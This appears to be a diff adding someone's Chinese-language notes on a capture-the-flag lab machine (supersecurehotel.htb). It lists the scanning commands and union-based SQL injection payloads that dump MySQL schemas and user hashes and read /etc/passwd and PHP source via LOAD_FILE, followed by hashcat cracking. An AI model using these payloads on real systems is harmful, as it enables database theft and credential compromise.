@@ -1,0 +1,32 @@
+nmap -sC -sV -Pn 10.129.1.113 > nmap.txt
+
+gobuster dir  -u http://supersecurehotel.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,cgi -t 50> gobuster.txt
+
+
+
+
+1.nmap 掃描發現22及80端口
+2.80端口的頁面發現有cod=4的SQL Injection漏洞
+3.SQLmap可以取得帳號密碼DBadmin,imissyou,(可以參考ippsec影片手動SQL Injection)
+sqlmap -u http://supersecurehotel.htb/room.php?cod=4 -users -passwords
+###使用手動嘗試到7可以正常顯示頁面,代表這個SQL語句select 7個欄位,可以將變數帶入顯示出來
+http://supersecurehotel.htb/room.php?cod=9999 union select "1","2","3","4","5","6","7"
+http://supersecurehotel.htb/room.php?cod=9999 union select "1","2",select @@database,"4","5","6","7"
+   這句urlencode可以取得database訊息        9999 union select "1","2",(SELECT @@version),"4","5","6","7"
+   這句urlencode可以取得所有庫名             9999 union select "1","2",(select group_concat(schema_name,"\r\n") from information_schema.schemata),"4","5","6","7"
+hotel,information_schema,mysql,performance_schema
+   這句urlencode可以取得hotel庫的所有table訊息        9999 union select "1","2",(select group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n") from information_Schema.COLUMNS where TABLE_SCHEMA = 'hotel'),"4","5","6","7"
+room:name,room:price,room:descrip,room:star,room:image,room:mini
+   這句urlencode可以取得mysql庫的所有table訊息        9999 union select "1","2",(select group_concat(TABLE_NAME,":",COLUMN_NAME,"\r\n") from information_Schema.COLUMNS where TABLE_SCHEMA = 'mysql'),"4","5","6","7"
+查看到mysql有個user表後,查看表內容
+   這句urlencode可以取得mysql庫的user表訊息        9999 union select "1","2",(select group_concat(host,":",user,":",password,"\r\n") from mysql.user),"4","5","6","7"
+localhost:DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
+
+4.使用hashcat查看密碼type
+hashcat --example |grep mysql -i -C 3
+5.使用hashcat破解密碼
+hashcat -m 300 hash /usr/share/wordlists/rockyou.txt
+6.mysql也有查看檔案的語句,將index.php用base64加密後傳回本地解密打開,發現連到DB的connection.php,載下後查看到密碼
+這句urlencode可以查看檔案內容         9999 union select "1","2",(LOAD_FILE("/etc/passwd")),"4","5","6","7"
+這句urlencode可以查看檔案內容         9999 union select "1","2",(TO_BASE64(LOAD_FILE("/var/www/html/index.php"))),"4","5","6","7"
+這句urlencode可以查看檔案內容         9999 union select "1","2",(TO_BASE64(LOAD_FILE("/var/www/html/connection.php"))),"4","5","6","7"
